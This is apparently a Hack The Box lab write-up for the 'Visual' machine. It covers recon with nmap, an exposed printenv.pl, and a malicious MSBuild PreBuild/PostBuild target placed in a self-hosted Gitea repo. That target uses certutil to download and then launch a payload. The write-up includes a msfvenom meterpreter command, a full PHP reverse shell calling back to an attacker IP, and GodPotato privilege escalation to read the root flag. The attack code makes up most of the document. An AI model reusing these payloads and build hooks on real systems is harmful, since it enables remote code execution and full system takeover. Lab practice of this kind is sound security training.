nmap:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-26 13:01 EST
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 96.75% done; ETC: 13:03 (0:00:03 remaining)
Nmap scan report for 10.10.11.234
Host is up (0.27s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.15 seconds

using dirsearch i found that there is directory named /cgi-bin/printenv.pl

inside it i found:
    COMSPEC="C:\Windows\system32\cmd.exe"
    CONTEXT_DOCUMENT_ROOT="/xampp/cgi-bin/"
    CONTEXT_PREFIX="/cgi-bin/"
    DOCUMENT_ROOT="C:/xampp/htdocs"
    GATEWAY_INTERFACE="CGI/1.1"
    HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    HTTP_ACCEPT_ENCODING="gzip, deflate, br"
    HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
    HTTP_CONNECTION="close"
    HTTP_HOST="10.10.11.234"
    HTTP_UPGRADE_INSECURE_REQUESTS="1"
    HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    MIBDIRS="/xampp/php/extras/mibs"
    MYSQL_HOME="\xampp\mysql\bin"
    OPENSSL_CONF="/xampp/apache/bin/openssl.cnf"
    PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\dotnet\;C:\ProgramData\chocolatey\bin;C:\Program Files\Git\cmd;C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\WindowsApps"
    PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
    PHPRC="\xampp\php"
    PHP_PEAR_SYSCONF_DIR="\xampp\php"
    QUERY_STRING=""
    REMOTE_ADDR="10.10.16.120"
    REMOTE_PORT="33422"
    REQUEST_METHOD="GET"
    REQUEST_SCHEME="http"
    REQUEST_URI="/cgi-bin/printenv.pl"
    SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
    SCRIPT_NAME="/cgi-bin/printenv.pl"
    SERVER_ADDR="10.10.11.234"
    SERVER_ADMIN="postmaster@localhost"
    SERVER_NAME="10.10.11.234"
    SERVER_PORT="80"
    SERVER_PROTOCOL="HTTP/1.1"
    SERVER_SIGNATURE="<address>Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17 Server at 10.10.11.234 Port 80</address>\n"
    SERVER_SOFTWARE="Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17"
    SYSTEMROOT="C:\Windows"
    TMP="\xampp\tmp"
    WINDIR="C:\Windows"

The MSBuild can be exploited by executing a predefined command before the actual build happens.

MSBuild's PreBuildEvent can be manipulated to execute custom commands before the actual build process starts. This is done by defining a custom target (PreBuild) that runs before the PreBuildEvent.

https://www.reddit.com/r/hackthebox/comments/16woaz1/visual_machine/

to host gitea on local machine i needed to download the gitea binary from official website to kali machine

after gave it chmod +x and , gitea needs mysql to launch on web browser, so i did systemctl start mysql

then i needed to create database for gitea

so i did:
    create database giteadb;

created a user for it:
    CREATE USER 'gituser'@'localhost' IDENTIFIED BY 'giteapass';

and grant permissions:
    GRANT ALL PRIVILEGES ON giteadb.* TO 'gituser'@'localhost';

to make sure to apply the changes bye flashing the privileges:
    FLUSH PRIVILEGES;

after it, it can be runs

now i need a dotnet 6.0 to install on my machine

using :
    sudo apt-get update; \
sudo apt-get install -y apt-transport-https && \
sudo apt-get update && \
sudo apt-get install -y dotnet-sdk-6.0

after that i need to create a new Project and make a simple application by using:
    dotnet new sln -o Repo
cd Repo
dotnet new console -o Repo.ConsoleApp --framework net6.0
dotnet sln Repo.sln add Repo.ConsoleApp/Repo.ConsoleApp.csproj

make changes in Repo/Repo.ConsoleApp , in the Program.cs insert a simple hello world application:
namespace Program
{
 public class Program
 {
  public static void Main(string[] args)
  {
   Console.WriteLine("Hello world");
  }
 }
}

and i need to add PreBuild and PostBuild event to Repo.ConsoleApp.csproj:
    <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="certutil -urlcache -f <ip>/<file>.exe %temp%/s.exe" />
</Target>

<Target Name="PostBuild" AfterTargets="PostBuildEvent">
  <Exec Command="start %temp%/s.exe" />
</Target>

now we need to create reverse shell payload via msfvenom:
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o s.exe

now we need to open python3 server using:
    python3 -m http.server 4443

[registries.search]
registries = ['docker.io', 'quay.io']

repo http://10.10.16.125/gituser/New

i got the shell

in :\Users\enox\Desktop a userflag:
    d7529a8c7a9b0d4935463d3b518e6e0e


c:\Users\enox\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

to escalate my privileges im gonna need to use FullPower(https://github.com/itm4n/FullPowers) and PotatoGod(https://github.com/BeichenDream/GodPotato) tools

there is a compiled exe in (https://github.com/itm4n/FullPowers/releases)

first thing i need to compile the c# file to exe

i can do this by using MSBuild Visual Studio in my windows machine

important to notice that before using the build, need to be changed from debug to release options

after that i need to open a reverse shell using:
    <?php
// Copyright (c) 2020 Ivan Å incek
// v2.6
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer = 1024;  // read/write buffer size
    private $clen   = 0;     // command length
    private $error  = false; // stream read/write error
    private $sdump  = true;  // script's dump
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
            // once daemonized, you will actually no longer see the script's dump
        } else if (posix_setsid() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        if ($this->sdump) {
            $data = str_replace('<', '<', $data);
            $data = str_replace('>', '>', $data);
            echo $data;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // so we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.16.125', 4443);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>

now i need to trigger the rev.php again

open listener on other port and get the second reverse shell

now i need to download FullPowers in C:\xampp\htdocs\uploads> and launch it

after the new process started i need to use GodPotato

i need to download the GodPotato to uploads directory,otherwise its not gonna work

after downloading the GodPotato, used :

    GP -cmd "cmd /c type c:\Users\Administrator\Desktop\root.txt"

to send a command as NT authority and get the root flag:
    1b1b7f0289764ea43b0c17b641f71e32